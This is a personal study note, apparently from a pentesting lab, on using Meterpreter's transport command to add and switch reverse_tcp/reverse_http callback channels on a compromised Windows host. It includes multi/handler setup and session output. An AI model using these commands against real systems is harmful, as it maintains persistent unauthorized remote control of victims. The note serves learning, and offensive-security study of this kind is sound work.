## Pre-requisite --> [[]]
- The `transport` command allows you to add a new transport to your current sessions with `reverse_tcp` and `reverse_https` as the top favorites.
- Meterpreter offers you some other transports for you to choose from.

## Displaying the help for the command:
```python
meterpreter > transport -h
Usage: transport <list|change|add|next|prev|remove> [options]

   list: list the currently active transports.
    -----------------------------SNIP-----------------------------------
```

## Displaying current active transports:
```python
meterpreter > transport list
Session Expiry  : @ 2023-03-24 15:54:08

    ID  Curr  URL                       Comms T/O  Retry Total  Retry Wait
    --  ----  ---                       ---------  -----------  ----------
    1   *     tcp://192.168.216.9:4444  300        3600         10
```

## Adding new transports:
```python
meterpreter > transport add -t reverse_http -l 192.168.1.8 -p 8080
[*] Adding new transport ...
[+] Successfully added reverse_http transport.
```
- Adding new transports allows Metasploit to keep the sessions alive for longer.
- `-t` option to specify the type of transport to add. The available types are `bind_tcp`, `reverse_tcp`, `reverse_http`, and `reverse_https`.
- `-l` option is used to set the LHOST.
- `-p` option is used to set the LPORT.

## Listing the available transports after adding it:
![[transport_list.png]]
## Changing the transport
```python
meterpreter > background
[*] Backgrounding session 10...
msf6 exploit(windows/smb/psexec) > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_http
PAYLOAD => windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LPORT 8080
LPORT => 8080
msf6 exploit(multi/handler) > set LHOST 192.168.216.9
LHOST => 192.168.216.9
msf6 exploit(multi/handler) > run -j
[*] Exploit running as background job 3.
[*] Exploit completed, but no session was created.

[*] Started HTTP reverse handler on http://192.168.216.9:8080
meterpreter > sessions
Active sessions
===============

  Id  Name  Type                     Information                           Connection
  --  ----  ----                     -----------                           ----------
  10        meterpreter x86/windows  NT AUTHORITY\SYSTEM @ VAGRANT-2008R2  192.168.216.9:4444 -> 192.168.216.11:49575 (192.168.216.11)
  11        meterpreter x86/windows                                        192.168.216.9:8080 -> 192.168.216.11:49678 (192.168.216.11)

msf6 exploit(multi/handler) > sessions -i 11
[*] Starting interaction with 11...

meterpreter > transport next[*] Meterpreter session 11 opened (192.168.216.9:8080 -> 192.168.216.11:49678) at 2023-03-17 16:22:09 +0530

[*] Changing to next transport ...
[+] Successfully changed to the next transport, killing current session.

[*] 192.168.216.11 - Meterpreter session 11 closed.  Reason: User exit
msf6 exploit(multi/handler) > [*] 192.168.216.11 - Meterpreter session 11 closed.  Reason: Died
msf6 exploit(multi/handler) > sessions -i 10
[*] Starting interaction with 10...

meterpreter > transport list
Session Expiry  : @ 2023-03-24 16:17:23

    ID  Curr  URL                       Comms T/O  Retry Total  Retry Wait
    --  ----  ---                       ---------  -----------  ----------
    1   *     tcp://192.168.216.9:4444  300        3600         10
    2         tcp://192.168.216.9:8080  300        3600         10
```
- As you can see from the output, we have successfully changed to the next transport on the list using the `transport next` command. 
- To change to the previous transport, simply use the `transport prev` command.

# The transport command sometimes not working perfectly it lost almost of my 2-3 days.